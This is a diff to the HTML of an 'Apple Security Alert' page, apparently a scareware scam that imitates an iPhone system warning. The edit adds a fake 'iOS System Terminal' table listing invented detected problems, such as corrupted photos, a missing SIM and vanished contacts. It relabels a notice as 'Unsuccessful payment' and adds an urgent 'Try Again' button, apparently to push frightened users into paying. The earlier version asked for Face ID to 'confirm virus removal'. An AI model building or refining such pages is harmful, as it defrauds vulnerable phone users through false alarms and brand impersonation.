@@ -10,7 +10,7 @@
     <meta name="theme-color" content="#f8f7f9">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <link rel="stylesheet" href="css/style.css?v=4">
+    <link rel="stylesheet" href="css/style.css?v=15">
     <title>Apple Security Alert</title>
 </head>
 
@@ -261,69 +261,94 @@
 
             <div class="step-three__overlay">
                 <div class="step-three__notification step-three__notification--unsuccessful">
-                    <img src="./assets/_icon_apple.svg" alt="AppleCare" class="step-three__notification-icon" draggable="false">
+                    <img src="./assets/AppStore-Icon.svg" alt="App Store" class="step-three__notification-icon step-three__notification-icon--appstore" draggable="false">
+                    <span class="step-three__notification-badge" aria-hidden="true"></span>
                     <div class="step-three__notification-content">
                         <div class="step-three__notification-header">
-                            <p>Unsuccessful cleaning</p>
+                            <p>Unsuccessful payment</p>
                             <span>now</span>
                         </div>
                         <p class="unsuccessful-note">Your device is still not protected!</p>
                     </div>
                 </div>
 
-                <div class="step-three__popup step-three__popup--confirm">
-                    <div class="step-three__popup-wrapper">
-                        <h1 class="step-three__popup-title">Confirm Removal</h1>
-                        <p class="step-three__popup-message">
-                            Please use Face ID or Touch ID to confirm virus removal
-                        </p>
+                <div class="step-three__risk-sheet" id="step-three-risk-sheet" aria-hidden="true">
+                    <img src="./assets/warning_icon2.svg" alt="Warning" class="step-three__risk-sheet-warning" draggable="false">
+                    <h2 class="step-three__risk-sheet-title">Your device is still at risk!</h2>
+                    <p class="step-three__risk-sheet-message">
+                        Urgently click on &ldquo;Try Again&rdquo; and remove all viruses and errors
+                    </p>
+
+                    <div class="step-three__risk-terminal">
+                        <h3>iOS System Terminal:</h3>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Code</th>
+                                    <th>Process</th>
+                                    <th>Message</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>484838</td>
+                                    <td class="detected">Detected</td>
+                                    <td>Slow Charging</td>
+                                </tr>
+                                <tr>
+                                    <td>394393</td>
+                                    <td class="detected">Detected</td>
+                                    <td>Battery Overheating</td>
+                                </tr>
+                                <tr>
+                                    <td>383833</td>
+                                    <td class="detected">Detected</td>
+                                    <td>Corrupted Photos</td>
+                                </tr>
+                                <tr>
+                                    <td>323233</td>
+                                    <td class="detected">Detected</td>
+                                    <td>Memory Critical</td>
+                                </tr>
+                                <tr>
+                                    <td>323255</td>
+                                    <td class="detected">Detected</td>
+                                    <td>No Internet Access</td>
+                                </tr>
+                                <tr>
+                                    <td>504943</td>
+                                    <td class="detected">Detected</td>
+                                    <td>SIM Card Not Found</td>
+                                </tr>
+                                <tr>
+                                    <td>584747</td>
+                                    <td class="detected">Detected</td>
+                                    <td>Contacts Disappeared</td>
+                                </tr>
+                                <tr>
+                                    <td>573647</td>
+                                    <td class="detected">Detected</td>
+                                    <td>Display Glitch</td>
+                                </tr>
+                                <tr>
+                                    <td>595843</td>
+                                    <td class="detected">Detected</td>
+                                    <td>High CPU Usage</td>
+                                </tr>
+                            </tbody>
+                        </table>
                     </div>
-                    <button class="step-three__popup-btns" id="subscribe-confirm-btn">
-                        <span>Continue</span>
-                        <div class="step-three__popup-spinner">
-                            <div class="spinner">
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                            </div>
-                        </div>
-                    </button>
+
+                    <p class="step-three__risk-sheet-loss">Take immediate action to prevent data loss!</p>
+                    <button class="scan-button step-three__try-again-button" id="try-again-btn">Try Again</button>
                 </div>
 
-                <div class="step-three__popup step-three__popup--risk">
-                    <div class="step-three__popup-wrapper">
-                        <h1 class="step-three__popup-title">Your device is still at risk!</h1>
-                        <p class="step-three__popup-message">
-                            It is recommended to protect your phone immediately!
-                        </p>
-                    </div>
-                    <button class="step-three__popup-btns" id="subscribe-risk-btn">
-                        <span>Continue</span>
-                        <div class="step-three__popup-spinner">
-                            <div class="spinner">
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                                <div class="spinner-blade"></div>
-                            </div>
-                        </div>
-                    </button>
-                </div>
             </div>
         </div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
-    <script src="js/main.js?v=13"></script>
+    <script src="js/main.js?v=17"></script>
 </body>
 
 </html>
